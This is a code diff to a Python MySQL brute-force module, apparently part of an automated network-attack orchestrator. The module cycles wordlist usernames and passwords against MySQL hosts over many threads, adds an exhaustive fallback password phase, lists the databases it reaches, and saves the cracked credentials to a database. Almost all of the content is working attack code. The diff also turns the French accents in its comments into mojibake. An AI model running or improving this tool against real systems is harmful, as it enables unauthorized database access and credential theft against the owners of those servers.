@@ -1,9 +1,9 @@
-"""
-sql_bruteforce.py — MySQL bruteforce (DB-backed, no CSV/JSON, no rich)
-- Cibles: (ip, port) par l’orchestrateur
+﻿"""
+sql_bruteforce.py â€” MySQL bruteforce (DB-backed, no CSV/JSON, no rich)
+- Cibles: (ip, port) par lâ€™orchestrateur
 - IP -> (MAC, hostname) via DB.hosts
-- Connexion sans DB puis SHOW DATABASES; une entrée par DB trouvée
-- Succès -> DB.creds (service='sql', database=<db>)
+- Connexion sans DB puis SHOW DATABASES; une entrÃ©e par DB trouvÃ©e
+- SuccÃ¨s -> DB.creds (service='sql', database=<db>)
 - Conserve la logique (pymysql, queue/threads)
 """
 
@@ -16,6 +16,7 @@ from queue import Queue
 from typing import List, Dict, Tuple, Optional
 
 from shared import SharedData
+from actions.bruteforce_common import ProgressTracker, merged_password_plan
 from logger import Logger
 
 logger = Logger(name="sql_bruteforce.py", level=logging.DEBUG)
@@ -44,18 +45,20 @@ class SQLBruteforce:
         return self.sql_bruteforce.run_bruteforce(ip, port)
 
     def execute(self, ip, port, row, status_key):
-        """Point d’entrée orchestrateur (retour 'success' / 'failed')."""
+        """Point d'entrÃ©e orchestrateur (retour 'success' / 'failed')."""
+        self.shared_data.bjorn_orch_status = "SQLBruteforce"
+        self.shared_data.comment_params = {"user": "?", "ip": ip, "port": str(port)}
         success, results = self.bruteforce_sql(ip, port)
         return 'success' if success else 'failed'
 
 
 class SQLConnector:
-    """Gère les tentatives SQL (MySQL), persistance DB, mapping IP→(MAC, Hostname)."""
+    """GÃ¨re les tentatives SQL (MySQL), persistance DB, mapping IPâ†’(MAC, Hostname)."""
 
     def __init__(self, shared_data):
         self.shared_data = shared_data
 
-        # Wordlists inchangées
+        # Wordlists inchangÃ©es
         self.users = self._read_lines(shared_data.users_file)
         self.passwords = self._read_lines(shared_data.passwords_file)
 
@@ -66,6 +69,7 @@ class SQLConnector:
         self.lock = threading.Lock()
         self.results: List[List[str]] = []  # [ip, user, password, port, database, mac, hostname]
         self.queue = Queue()
+        self.progress = None
 
     # ---------- util fichiers ----------
     @staticmethod
@@ -109,16 +113,20 @@ class SQLConnector:
         return self._ip_to_identity.get(ip, (None, None))[1]
 
     # ---------- SQL ----------
-    def sql_connect(self, adresse_ip: str, user: str, password: str):
+    def sql_connect(self, adresse_ip: str, user: str, password: str, port: int = 3306):
         """
         Connexion sans DB puis SHOW DATABASES; retourne (True, [dbs]) ou (False, []).
         """
+        timeout = int(getattr(self.shared_data, "sql_connect_timeout_s", 6))
         try:
             conn = pymysql.connect(
                 host=adresse_ip,
                 user=user,
                 password=password,
-                port=3306
+                port=port,
+                connect_timeout=timeout,
+                read_timeout=timeout,
+                write_timeout=timeout,
             )
             try:
                 with conn.cursor() as cursor:
@@ -134,7 +142,7 @@ class SQLConnector:
             logger.info(f"Available databases: {', '.join(databases)}")
             return True, databases
         except pymysql.Error as e:
-            logger.error(f"Failed to connect to {adresse_ip} with user {user}: {e}")
+            logger.debug(f"Failed to connect to {adresse_ip} with user {user}: {e}")
             return False, []
 
     # ---------- DB upsert fallback ----------
@@ -182,17 +190,20 @@ class SQLConnector:
 
             adresse_ip, user, password, port = self.queue.get()
             try:
-                success, databases = self.sql_connect(adresse_ip, user, password)
+                success, databases = self.sql_connect(adresse_ip, user, password, port=port)
                 if success:
                     with self.lock:
                         for dbname in databases:
                             self.results.append([adresse_ip, user, password, port, dbname])
                         logger.success(f"Found credentials  IP:{adresse_ip} | User:{user} | Password:{password}")
                         logger.success(f"Databases found: {', '.join(databases)}")
+                        self.shared_data.comment_params = {"user": user, "ip": adresse_ip, "port": str(port), "databases": str(len(databases))}
                         self.save_results()
                         self.remove_duplicates()
                         success_flag[0] = True
             finally:
+                if self.progress is not None:
+                    self.progress.advance(1)
                 self.queue.task_done()
 
                 # Optional delay between attempts
@@ -201,48 +212,56 @@ class SQLConnector:
 
 
     def run_bruteforce(self, adresse_ip: str, port: int):
-        total_tasks = len(self.users) * len(self.passwords)
+        self.results = []
+        dict_passwords, fallback_passwords = merged_password_plan(self.shared_data, self.passwords)
+        total_tasks = len(self.users) * (len(dict_passwords) + len(fallback_passwords))
         if total_tasks == 0:
             logger.warning("No users/passwords loaded. Abort.")
             return False, []
 
-        for user in self.users:
-            for password in self.passwords:
-                if self.shared_data.orchestrator_should_exit:
-                    logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
-                    return False, []
-                self.queue.put((adresse_ip, user, password, port))
-
+        self.progress = ProgressTracker(self.shared_data, total_tasks)
         success_flag = [False]
-        threads = []
-        thread_count = min(40, max(1, total_tasks))
 
-        for _ in range(thread_count):
-            t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
-            t.start()
-            threads.append(t)
+        def run_phase(passwords):
+            phase_tasks = len(self.users) * len(passwords)
+            if phase_tasks == 0:
+                return
 
-        while not self.queue.empty():
-            if self.shared_data.orchestrator_should_exit:
-                logger.info("Orchestrator exit signal received, stopping bruteforce.")
-                while not self.queue.empty():
-                    try:
-                        self.queue.get_nowait()
-                        self.queue.task_done()
-                    except Exception:
-                        break
-                break
+            for user in self.users:
+                for password in passwords:
+                    if self.shared_data.orchestrator_should_exit:
+                        logger.info("Orchestrator exit signal received, stopping bruteforce task addition.")
+                        return
+                    self.queue.put((adresse_ip, user, password, port))
 
-        self.queue.join()
-        for t in threads:
-            t.join()
+            threads = []
+            thread_count = min(8, max(1, phase_tasks))
+            for _ in range(thread_count):
+                t = threading.Thread(target=self.worker, args=(success_flag,), daemon=True)
+                t.start()
+                threads.append(t)
 
-        logger.info(f"Bruteforcing complete with success status: {success_flag[0]}")
-        return success_flag[0], self.results
+            self.queue.join()
+            for t in threads:
+                t.join()
+
+        try:
+            run_phase(dict_passwords)
+            if (not success_flag[0]) and fallback_passwords and not self.shared_data.orchestrator_should_exit:
+                logger.info(
+                    f"SQL dictionary phase failed on {adresse_ip}:{port}. "
+                    f"Starting exhaustive fallback ({len(fallback_passwords)} passwords)."
+                )
+                run_phase(fallback_passwords)
+            self.progress.set_complete()
+            logger.info(f"Bruteforcing complete with success status: {success_flag[0]}")
+            return success_flag[0], self.results
+        finally:
+            self.shared_data.bjorn_progress = ""
 
     # ---------- persistence DB ----------
     def save_results(self):
-        # pour chaque DB trouvée, créer/mettre à jour une ligne dans creds (service='sql', database=<dbname>)
+        # pour chaque DB trouvÃ©e, crÃ©er/mettre Ã  jour une ligne dans creds (service='sql', database=<dbname>)
         for ip, user, password, port, dbname in self.results:
             mac = self.mac_for_ip(ip)
             hostname = self.hostname_for_ip(ip) or ""
@@ -269,7 +288,7 @@ class SQLConnector:
         self.results = []
 
     def remove_duplicates(self):
-        # inutile avec l’index unique; conservé pour compat.
+        # inutile avec lâ€™index unique; conservÃ© pour compat.
         pass
 
 
@@ -282,3 +301,4 @@ if __name__ == "__main__":
     except Exception as e:
         logger.error(f"Error: {e}")
         exit(1)
+
